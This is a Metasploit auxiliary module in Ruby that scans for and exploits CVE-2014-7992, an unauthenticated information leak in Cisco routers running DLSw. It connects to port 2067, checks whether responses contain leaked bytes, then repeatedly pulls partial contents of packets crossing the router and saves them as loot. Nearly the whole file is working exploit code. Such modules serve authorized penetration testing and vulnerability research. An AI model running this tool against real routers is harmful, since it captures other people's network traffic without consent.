##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'socket'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize
    super(
      'Name'           => 'Cisco DLSw Information Disclosure Scanner',
      'Description'    => %q(
        This module implements the DLSw information disclosure retrieval. There
        is a bug in Cisco's DLSw implementation affecting 12.x and 15.x trains
        that allows an unauthenticated remote attacker to retrieve the partial
        contents of packets traversing a Cisco router with DLSw configured
        and active.
      ),
      'Author'         => [
        'Tate Hansen', # Vulnerability discovery
        'John McLeod', # Vulnerability discovery
        'Kyle Rainey' # Built lab to recreate vulnerability and help test
      ],
      'References'     =>
        [
          ['CVE', '2014-7992'],
          ['URL', 'https://github.com/tatehansen/dlsw_exploit']
        ],
      'DisclosureDate' => 'Nov 17 2014',
      'License'        => MSF_LICENSE
    )

    register_options(
      [
        Opt::RPORT(2067),
        OptInt.new('LEAK_AMOUNT', [true, 'The number of bytes to store before shutting down.', 1024])
      ])
  end

  def get_response(size = 72)
    connect
    response = sock.get_once(size)
    disconnect
    response
  end

  # Called when using check
  def check_host(_ip)
    print_status("Checking for DLSw information disclosure (CVE-2014-7992)")
    response = get_response

    if response.blank?
      vprint_status("No response")
      Exploit::CheckCode::Safe
    elsif response[0..1] == "\x31\x48" || response[0..1] == "\x32\x48"
      vprint_good("Detected DLSw protocol")
      report_service(
        host: rhost,
        port: rport,
        proto: 'tcp',
        name: 'dlsw'
      )
      # TODO: check that response has something that truly indicates it is vulnerable
      # and not simply that it responded
      unless response[18..72].scan(/\x00/).length == 54
        print_good("Vulnerable to DLSw information disclosure; leaked #{response.length} bytes")
        report_vuln(
          host: rhost,
          port: rport,
          name: name,
          refs: references,
          info: "Module #{fullname} collected #{response.length} bytes"
        )
        Exploit::CheckCode::Vulnerable
      end
    else
      vprint_status("#{response.size}-byte response didn't contain any leaked data")
      Exploit::CheckCode::Safe
    end
  end

  # Main method
  def run_host(ip)
    return unless check_host(ip) == Exploit::CheckCode::Vulnerable

    dlsw_data = ''
    until dlsw_data.length > datastore['LEAK_AMOUNT']
      response = get_response
      dlsw_data << response[18..72] unless response.blank?
    end
    loot_and_report(dlsw_data)
  end

  def loot_and_report(dlsw_leak)
    path = store_loot(
      'dlsw.packet.contents',
      'application/octet-stream',
      rhost,
      dlsw_leak,
      'DLSw_leaked_data',
      'DLSw packet memory leak'
    )
    print_status("DLSw leaked data stored in #{path}")
  end
end
